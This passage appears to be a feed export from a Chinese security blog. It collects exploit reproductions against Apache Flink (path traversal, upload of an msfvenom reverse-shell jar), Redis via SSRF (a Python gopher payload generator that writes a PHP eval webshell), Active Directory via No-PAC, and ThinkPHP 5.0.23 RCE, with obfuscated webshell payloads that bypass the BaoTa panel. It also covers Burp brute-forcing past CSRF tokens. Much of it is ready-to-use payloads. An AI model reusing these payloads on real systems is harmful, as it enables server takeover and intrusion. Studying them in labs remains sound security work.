        <content type="html"><![CDATA[<p>业精于勤而荒于嬉，行成于思而毁于随</p><hr><span id="more"></span><p>使用 <code>vulnhub</code> 搭建环境，直接 <code>docker-compose up -d</code> 启动环境</p><p>访问 <code>IP:8081</code> </p><p><img src="../../../../img/22-1-21/image-20220121115008093.png" alt="Assassins小白"></p><p>先复现个最简单的任意文件读取 (CVE-2020-17519)</p><p><strong>影响版本</strong> : <code>1.11.0</code>  <code>1.11.1</code>  <code>1.11.2</code></p><p>直接读取 <code>/etc/passwd</code> 文件</p><p>POC：</p><blockquote><p>/jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd</p></blockquote><p><img src="../../../../img/22-1-21/image-20220121115609580.png" alt="Assassins小白"></p><p>再复现任意文件上传(CVE-2020-17518)</p><p><strong>影响版本</strong> : <code>1.5.1 - 1.11.2</code></p><p>使用 <code>msfvenom</code> 生成 <code>java</code> 反弹 <code>shell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;shell_reverse_tcp LHOST&#x3D;IP LPORT&#x3D;端口 -f jar &gt; 生成的jar包</span><br></pre></td></tr></table></figure><p><img src="../../../../img/22-1-21/image-20220124160552644.png" alt="Assassins小白"></p><p>再创建一个监听</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">handler -p java&#x2F;shell_reverse_tcp -H 10.211.55.11 -P 2231</span><br></pre></td></tr></table></figure><p><img src="../../../../img/22-1-21/image-20220124160947183.png" alt="Assassins小白"></p><p>然后上传到网站，选择 <code>Submit New Job</code>  ，点击 <code>Add New</code> 上传 <code>jar</code> 包 ，然后选择上传的 <code>jar</code> 包，点击 <code>Submit</code></p><p><img src="../../../../img/22-1-21/image-20220121171743002.png" alt="Assassins小白"></p><p>这样就可以上线了，但是我没有在外网搭建msf，也不想做内网穿透，就不展示上线了</p>]]></content>
      
      
      
        <tags>
            
            <tag> Apache Flink </tag>
            
            <tag> CVE-2020-17518 </tag>
            
            <tag> CVE-2020-17519 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF打内网redis</title>
      <link href="2022/01/19/SSRF%E6%89%93%E5%86%85%E7%BD%91redis/"/>
      <url>2022/01/19/SSRF%E6%89%93%E5%86%85%E7%BD%91redis/</url>
      
        <content type="html"><![CDATA[<p>旁观的时候，每个人都是智者</p><hr><span id="more"></span><p>经典的微盘ssrf，有回显</p><p><img src="../../../../img/22-1-19/image-20220119210930093.png" alt="Assassins小白"></p><p>file协议读取被拦截</p><p><img src="/../../../../img/22-1-19/image-20220119210954142.png" alt="Assassins小白"></p><p>使用dict协议请求 <code>6379</code> 端口，看到返回 <code>banner</code> 信息，说明端口开放</p><p><img src="../../../../img/22-1-19/image-20220119211012730.png" alt="Assassins小白"></p><p>可以再请求 <code>dict://127.0.0.1:6379/info</code> 如果能看到 <code>redis</code> 以及系统的一些信息，就说明存在未授权</p><p><img src="../../../../img/22-1-19/image-20220119211027700.png" alt="Assassins小白"></p><p>如果返回 <code>Authentication required</code> 就是需要密码<br>可以使用dict协议爆破密码：<code>dict://127.0.0.1:6379/auth:&lt;password&gt;</code></p><p>访问漏洞<code>api</code>地址爆出绝对路径  <code>/application/index/controller/Api.php</code></p><p><img src="../../../../img/22-1-19/image-20220119211041459.png" alt="Assassins小白"></p><p>有了绝对路径就可以写shell了</p><p>使用如下代码生成 <code>gopher</code> 的 <code>payload</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">protocol = <span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="string">&quot;6788&quot;</span>  <span class="comment"># 端口</span></span><br><span class="line">shell = <span class="string">&quot;\n\n&lt;?php eval($_POST[\&quot;test\&quot;]);?&gt;\n\n&quot;</span> <span class="comment"># 写入内容</span></span><br><span class="line">filename = <span class="string">&quot;1.php&quot;</span>  <span class="comment"># shell名称</span></span><br><span class="line">path = <span class="string">&quot;/var/www/html&quot;</span>  <span class="comment"># 绝对路径</span></span><br><span class="line">passwd = <span class="string">&quot;&quot;</span></span><br><span class="line">cmd = [<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">     <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="built_in">format</span>(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),  </span><br><span class="line">     <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="built_in">format</span>(path),</span><br><span class="line">     <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="built_in">format</span>(filename),</span><br><span class="line">     <span class="string">&quot;save&quot;</span>,</span><br><span class="line">     <span class="string">&quot;quit&quot;</span></span><br><span class="line">    ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">    cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="built_in">format</span>(passwd))</span><br><span class="line">payload = protocol + ip + <span class="string">&quot;:&quot;</span> + port + <span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">    CRLF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;*&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>(redis_arr))</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">        cmd += CRLF + <span class="string">&quot;$&quot;</span> + <span class="built_in">str</span>(<span class="built_in">len</span>((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)))) + CRLF + x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">    cmd += CRLF</span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">        payload += urllib.parse.quote(redis_format(x))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(payload)</span></span><br><span class="line">    <span class="built_in">print</span>(urllib.parse.quote(payload))</span><br></pre></td></tr></table></figure><p>上面信息按需填写，然后直接运行就可以生成攻击payload了</p><p><img src="../../../../img/22-1-19/image-20220119211131576.png" alt="Assassins小白"></p><p>直接请求写入shell</p><p><img src="../../../../img/22-1-19/image-20220119211141177.png" alt="Assassins小白"></p><p>访问</p><p><img src="../../../../img/22-1-19/image-20220119211150256.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> SSRF </tag>
            
            <tag> Redis </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Github博客迁移到MacOS</title>
      <link href="2022/01/19/Github%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E5%88%B0MacOS/"/>
      <url>2022/01/19/Github%E5%8D%9A%E5%AE%A2%E8%BF%81%E7%A7%BB%E5%88%B0MacOS/</url>
      
        <content type="html"><![CDATA[<p>之前的电脑老是掉网卡，买过来几个月，掉了三次了，都得靠重装系统，安装驱动等手段来恢复，这次用着用着网卡又掉了，实在是不想一直这样陷入循环，每次都要重新配置电脑，就想直接换了</p><hr><span id="more"></span><p>Mac系统只需要安装node就可以了，Git自带的</p><p>下载地址：<a href="https://nodejs.org/en/">https://nodejs.org/en/</a></p><p>下载完成后双击 <code>pkg</code> 包安装，一直点击继续、同意即可</p><p><img src="../../../../img/22-1-19/image-20220119105937130.png" alt="Assassins小白"></p><p>输入 <code>node -v</code> 显示版本号就装好了</p><p><img src="../../../../img/22-1-19/image-20220119110134568.png" alt="Assassins小白"></p><p>也可以使用 <code>brew</code> 来安装，直接 <code>brew install node</code> 就可以</p><p>没有安装brew的使用一下命令安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;ruby -e &quot;$(curl -fsSL https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;Homebrew&#x2F;install&#x2F;master&#x2F;install)&quot;</span><br></pre></td></tr></table></figure><p>然后使用npm来安装hexo（npm是node.js的包管理工具，用它来安装hexo）</p><p><code>sudo npm install -g hexo-cli</code></p><p><img src="../../../../img/22-1-19/image-20220119110750345.png" alt="Assassins小白"></p><p><code>hexo -v</code> 检查是否安装成功</p><p><img src="../../../../img/22-1-19/image-20220119110854139.png" alt="Assassins小白"></p><p>安装好之后在桌面创建一个文件夹，当作我们博客的目录，然后在这个文件夹初始化我们的博客</p><p>进入该目录执行博客初始化操作</p><p><code>hexo init</code></p><p><img src="../../../../img/22-1-19/image-20220119111456141.png" alt="Assassins小白"></p><p>然后将我们之前博客的文件，粘贴进去，选择全部替换</p><p><img src="../../../../img/22-1-19/image-20220119111604894.png" alt="Assassins小白"></p><p>  然后 <code>hexo s</code> 本地看看效果是不是跟之前的博客一样</p><p><img src="../../../../img/22-1-19/image-20220119111741163.png" alt="Assassins小白"></p><p>然后配置客户端Git添加SSH Key到GitHub就好了</p><p>下面的命令最好手动敲，不然会报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config –-global user.email &quot;你的GitHub邮箱&quot;</span><br><span class="line">git config –-global user.name &quot;你的GitHub用户名&quot;</span><br></pre></td></tr></table></figure><p>本地创建SSH Key</p><blockquote><p> ssh-keygen -t rsa -C “邮箱地址”</p></blockquote><p>生成ssh key直接默认回车，输入密码..</p><p><img src="../../../../img/22-1-19/image-20220119112408547.png" alt="Assassins小白"></p><p>然后把本地生成的公钥文件 <code>.ssh/id_rsa.pub</code> 复制到GitHub的 <code>SSH and GPG keys</code></p><p><img src="../../../../img/22-1-19/image-20220119112758482.png" alt="Assassins小白"></p><p><code>ssh -T git@github.com</code></p><p>验证下SSH是否设置成功，提示输入密码，直接输入我们的系统密码就好了</p><p><img src="../../../../img/22-1-19/image-20220119115813096.png" alt="Assassins小白"></p><p><code>Hexo g -d</code> 文章发布成功</p><p><img src="../../../../img/22-1-19/image-20220119120309352.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> GitHub </tag>
            
            <tag> MacOS </tag>
            
            <tag> 博客迁移 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含之利用Windows特性包含未知文件</title>
      <link href="2022/01/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B9%8B%E5%88%A9%E7%94%A8Windows%E7%89%B9%E6%80%A7%E5%8C%85%E5%90%AB%E6%9C%AA%E7%9F%A5%E6%96%87%E4%BB%B6/"/>
      <url>2022/01/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B9%8B%E5%88%A9%E7%94%A8Windows%E7%89%B9%E6%80%A7%E5%8C%85%E5%90%AB%E6%9C%AA%E7%9F%A5%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>善良是很珍贵的，但善良没有长出牙齿来，那就是软弱</p><hr><span id="more"></span><p>最近在火线看的文章</p><p>发现这个思路14年左右就已经用在dedecms找后台上了，只不过我现在才知道，写个博客记录一下</p><p><strong>此特性只能在Windows环境下使用，因为 Windows 在搜索文件时使用到了 FindFirstFile 这一个 Winapi 函数</strong></p><h2 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h2><p><strong>知道文件所在目录，但不知道文件名的情况下来包含我们的马</strong></p><p>假如某处存在文件包含漏洞，我们需要上传一个我们自己的文件来包含，但如果上传的文件经过了重命名，且没有返回文件名，就可以使用此技巧包含</p><h2 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h2><p>我们可以将文件名未知部分的字符串使用 <code>&lt;</code> 或 <code>&gt;</code> 代替，但是需要注意：一个 <code>&lt;</code> 或 <code>&gt;</code> 只能代表一个字符</p><p>如果我们上传的马子为 shell.php，那么请求 <code>s&lt;</code> 或者 <code>s&gt;</code> 都是访问不到文件的。需要使用 <code>s&lt;&lt;</code> 才能访问到，含义为继续往下搜索</p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p><strong>文件包含漏洞：index.php</strong></p><p><img src="../../../../img/22-1-13/image-20220119142152242.png" alt="Assassins小白"></p><p><strong>webshell文件：shell.php</strong></p><p><img src="../../../../img/22-1-13/image-20220119142216006.png" alt="Assassins小白"></p><p>我们使用上述姿势包含 <code>shell.php</code> 文件</p><p><img src="../../../../img/22-1-13/image-20220119142240844.png" alt="Assassins小白"></p><p><strong>测试发现，在使用 <code>&lt;&lt;</code> 去匹配时，会优先匹配值最小的文件名称</strong></p><p><strong>如下文件名：</strong></p><p><img src="../../../../img/22-1-13/image-20220119142343249.png" alt="Assassins小白"></p><p>我们直接匹配 <code>2&lt;&lt;</code>会匹配到最小的 <code>202033333333333333333333.php</code> 文件</p><p><img src="../../../../img/22-1-13/image-20220119142408230.png" alt="Assassins小白"></p><p>如果需要匹配2022文件，需要增加文件的准确度，也就是 <code>2022&lt;&lt;</code></p><p><img src="../../../../img/22-1-13/image-20220119142428532.png" alt="Assassins小白"></p><h2 id="完结"><a href="#完结" class="headerlink" title="完结"></a>完结</h2><p>此特性并不是只有文件包含函数才可用，事实上还有很多函数也一样可利用这个特性，我们在进行代码审计的时候也可以注意一下，说不定就能挖出意想不到的漏洞</p><p><img src="../../../../img/22-1-13/image-20220119142447635.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
            <tag> Windows特性 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp爆破存在token认证的表单</title>
      <link href="2022/01/12/Burp%E7%88%86%E7%A0%B4%E5%AD%98%E5%9C%A8token%E8%AE%A4%E8%AF%81%E7%9A%84%E8%A1%A8%E5%8D%95/"/>
      <url>2022/01/12/Burp%E7%88%86%E7%A0%B4%E5%AD%98%E5%9C%A8token%E8%AE%A4%E8%AF%81%E7%9A%84%E8%A1%A8%E5%8D%95/</url>
      
        <content type="html"><![CDATA[<p>虽然没有拍到照片，但记在眼睛里也是好的</p><hr><span id="more"></span><p>Token正确返回下图：</p><p><img src="../../../../img/22-1-12/image-20220119122649463.png" alt="Assassins小白"></p><p>Token错误返回下图：</p><p><img src="../../../../img/22-1-12/image-20220119122754575.png" alt="Assassins小白"></p><p>token在返回包body和header头里面都有返回，那我们的思路就是每次请求先去获取token</p><p>我们去burp的爆破模块，先设置正则匹配，把token匹配出来</p><p><img src="../../../../img/22-1-12/image-20220119122922600.png" alt="Assassins小白"></p><p>然后选择 <code>pitchfork</code> 模式爆破，选中 <code>token</code> 和用户名进行爆破</p><p><img src="../../../../img/22-1-12/image-20220119122955341.png" alt="Assassins小白"></p><p>将第一个token值设置 <code>Recursive grep</code> 这样就会把我们正则匹配到的值放入第一个变量里面</p><p><img src="../../../../img/22-1-12/image-20220119123025618.png" alt="Assassins小白"></p><p>第二个值载入用户名字典，然后爆破</p><p><img src="../../../../img/22-1-12/image-20220119123042882.png" alt="Assassins小白"></p><p>提示递归grep不能和多线程一起用，我们只能使用单线程枚举了，用多线程并发可能会造成token混乱，导致token失效（一些验证码识别插件也只能单线程爆破也是这个原因）</p><p><img src="../../../../img/22-1-12/image-20220119123112422.png" alt="Assassins小白"></p><p>这样就可以了，不过爆破的速度会慢一点</p><p><img src="../../../../img/22-1-12/image-20220119123128457.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Burp </tag>
            
            <tag> Token </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>No-PAC(CVE-2021-42287/CVE-2021-42278)漏洞复现</title>
      <link href="2022/01/07/No-PAC-CVE-2021-42287-CVE-2021-42278-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>2022/01/07/No-PAC-CVE-2021-42287-CVE-2021-42278-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>简单测试一下，刚换系统，环境都没有了，只有之前测的一部分</p><hr><span id="more"></span><p><strong>前置条件：需要一个域用户</strong></p><p>kali环境下使用 <code>sam-the-admin</code> 项目进行攻击，只需一条命令<br>项目地址：<a href="https://github.com/WazeHell/sam-the-admin">https://github.com/WazeHell/sam-the-admin</a></p><p>获取权限Exp</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sam_the_admin.py <span class="string">&quot;king/windows03w:edcRFV222&quot;</span> -dc-ip 192.168.204.146 -shell</span><br></pre></td></tr></table></figure></blockquote><p>执行发现报错</p><p><img src="../../../../img/22-1-7/image-20220107212616776-16415687578051.png" alt="Assassins小白"></p><p>网上找解决方法，作者说应该是杀软拦截</p><p><img src="../../../../img/22-1-7/image-20220107212715403-16415687578062.png" alt="Assassins小白"></p><p>那我们关闭域控上面的defender尝试一下</p><p><img src="../../../../img/22-1-7/image-20220107212803698-16415687578063.png" alt="Assassins小白"></p><p>关闭defender果然就成功获取到域控的system权限了</p><p><img src="../../../../img/22-1-7/image-20220107212913285-16415687578064.png" alt="Assassins小白"></p>]]></content>
      
      
      
        <tags>
            
            <tag> CVE-2021-42287 </tag>
            
            <tag> CVE-2021-42278 </tag>
            
            <tag> 域控 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ThinkPHP5.0.23 RCE+Debug关闭+免费宝塔+PHP7</title>
      <link href="2021/12/31/ThinkPHP5-0-23-RCE-Debug%E5%85%B3%E9%97%AD-%E5%85%8D%E8%B4%B9%E5%AE%9D%E5%A1%94-PHP7/"/>
      <url>2021/12/31/ThinkPHP5-0-23-RCE-Debug%E5%85%B3%E9%97%AD-%E5%85%8D%E8%B4%B9%E5%AE%9D%E5%A1%94-PHP7/</url>
      
        <content type="html"><![CDATA[<p>多谢大家这一年的照顾和喜欢，这是我应得的</p><hr><span id="more"></span><p>在<code>phpinfo</code>里面搜索<code>session.save_path</code> ，可找session保存的位置</p><h3 id="session路径"><a href="#session路径" class="headerlink" title="session路径"></a>session路径</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;lib&#x2F;php&#x2F;sess_PHPSESSID</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_PHPSESSID</span><br><span class="line">&#x2F;tmp&#x2F;sess_PHPSESSID</span><br><span class="line">&#x2F;tmp&#x2F;sessions&#x2F;sess_PHPSESSID</span><br></pre></td></tr></table></figure><hr><h3 id="RCE读取PHPinfo"><a href="#RCE读取PHPinfo" class="headerlink" title="RCE读取PHPinfo"></a>RCE读取PHPinfo</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php?s&#x3D;captch</span><br><span class="line"></span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;phpinfo&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;-1</span><br></pre></td></tr></table></figure><p>设置 <code>server[REQUEST_METHOD]=-1</code> 可以看到phpinfo全部内容</p><h3 id="gethostbyname函数打dnslog"><a href="#gethostbyname函数打dnslog" class="headerlink" title="gethostbyname函数打dnslog"></a>gethostbyname函数打dnslog</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PODT &#x2F;index.php?s&#x3D;captch</span><br><span class="line"></span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;gethostbyname&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;g9kkb6.dnslog.cn</span><br></pre></td></tr></table></figure><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php?s&#x3D;captch</span><br><span class="line"></span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;readfile&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;.&#x2F;..&#x2F;application&#x2F;database.php</span><br></pre></td></tr></table></figure><h3 id="写shell进日志"><a href="#写shell进日志" class="headerlink" title="写shell进日志"></a>写shell进日志</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php?s&#x3D;captch</span><br><span class="line"></span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;call_user_func&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;&lt;?php eval($_POST[&#39;x&#39;])?&gt;</span><br></pre></td></tr></table></figure><h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php?s&#x3D;captch</span><br><span class="line"></span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\\\\__include_file&amp;server[]&#x3D;phpinfo&amp;get[]&#x3D;..&#x2F;runtime&#x2F;log&#x2F;201901&#x2F;21.log&amp;x&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><h2 id="正常session包含写马"><a href="#正常session包含写马" class="headerlink" title="正常session包含写马"></a>正常session包含写马</h2><h3 id="写马"><a href="#写马" class="headerlink" title="写马"></a>写马</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php?s&#x3D;captch</span><br><span class="line">Cookie: PHPSESSID&#x3D;test123</span><br><span class="line"></span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;think\\\\Session::set&amp;method&#x3D;get&amp;get[]&#x3D;&lt;?php eval($_GET[1]); ?&gt;&amp;server[]&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="包含-session-文件"><a href="#包含-session-文件" class="headerlink" title="包含 session 文件"></a>包含 session 文件</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php?s&#x3D;captch</span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think\\\\__include_file&amp;get[]&#x3D;&#x2F;tmp&#x2F;sess_test123&amp;server[]&#x3D;1</span><br></pre></td></tr></table></figure><h2 id="突破宝塔session包含写马1"><a href="#突破宝塔session包含写马1" class="headerlink" title="突破宝塔session包含写马1"></a>突破宝塔session包含写马1</h2><h3 id="写马-1"><a href="#写马-1" class="headerlink" title="写马"></a>写马</h3><p>使用 <code>php://filter</code>、<code>base64</code> 两次编码和 <code>strrev()</code> 反转函数绕过 </p><p>参考文章：<a href="https://www.cnblogs.com/wkzb/p/14156026.html">https://www.cnblogs.com/wkzb/p/14156026.html</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php&#x2F;?s&#x3D;captcha</span><br><span class="line">Cookie: PHPSESSID&#x3D;505test2</span><br><span class="line"></span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;think\\\\Session::set&amp;method&#x3D;get&amp;get[]&#x3D;abPD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX0dFVFsnciddKSk7Oz8%2bab&amp;server[]&#x3D;1</span><br></pre></td></tr></table></figure><p>写入马的内容为：<code>&lt;?php @eval(base64_decode($_GET[&#39;r&#39;]));;?&gt;</code></p><h3 id="包含"><a href="#包含" class="headerlink" title="包含"></a>包含</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;?s&#x3D;captcha&amp;r&#x3D;cGhwaW5mbygpOw&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;strrev&amp;filter[]&#x3D;think\\\\__include_file&amp;method&#x3D;get&amp;server[]&#x3D;1&amp;get[]&#x3D;2tset505_sses&#x2F;pmt&#x2F;&#x3D;ecruoser&#x2F;edoced-46esab.trevnoc&#x3D;daer&#x2F;retlif&#x2F;&#x2F;:php</span><br></pre></td></tr></table></figure><p><code>&amp;r=cGhwaW5mbygpOw==</code> 明文 -&gt; <code>&amp;r=phpinfo();2tset505_sses</code> 为反转后的session文件 <code>2tset505_sses/pmt/=ecruoser</code>    前面的<code>/pmt/</code>为反转后的session文件路径</p><h2 id="突破宝塔session包含写马2"><a href="#突破宝塔session包含写马2" class="headerlink" title="突破宝塔session包含写马2"></a>突破宝塔session包含写马2</h2><h3 id="写马-2"><a href="#写马-2" class="headerlink" title="写马"></a>写马</h3><p>通过 <code>str_rot13</code> 函数+变量引用绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?s&#x3D;captcha</span><br><span class="line">Cookie: PHPSESSID&#x3D;test2</span><br><span class="line"></span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;think\\\\Session::set&amp;method&#x3D;get&amp;get[]&#x3D;&lt;?php $aa&#x3D;str_rot13(&#39;riny(onfr64_qrpbqr($_CBFG[frghc]));&#39;); eval ($aa);?&gt;&amp;server[]&#x3D;1</span><br></pre></td></tr></table></figure><p>加密字段为 <code>eval(base64_decode($_POST[setup]));</code> 密码：<code>setup</code></p><h3 id="包含-1"><a href="#包含-1" class="headerlink" title="包含"></a>包含</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;?s&#x3D;captcha</span><br><span class="line"></span><br><span class="line">_method&#x3D;__construct&amp;method&#x3D;get&amp;filter[]&#x3D;think__include_file&amp;get[]&#x3D;&#x2F;tmp&#x2F;sess_test2&amp;server[]&#x3D;1&amp;setup&#x3D;cGhwaW5mbygpOw&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p><code>&amp;setup=cGhwaW5mbygpOw==</code> 明文 -&gt; <code>&amp;setup=phpinfo();</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ThinkPHP RCE </tag>
            
            <tag> Debug关闭 </tag>
            
            <tag> 免费宝塔 </tag>
            
            <tag> PHP7 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提取RDP会话中的明文账号密码</title>
      <link href="2021/12/16/%E6%8F%90%E5%8F%96RDP%E4%BC%9A%E8%AF%9D%E4%B8%AD%E7%9A%84%E6%98%8E%E6%96%87%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/"/>
      <url>2021/12/16/%E6%8F%90%E5%8F%96RDP%E4%BC%9A%E8%AF%9D%E4%B8%AD%E7%9A%84%E6%98%8E%E6%96%87%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/</url>
      
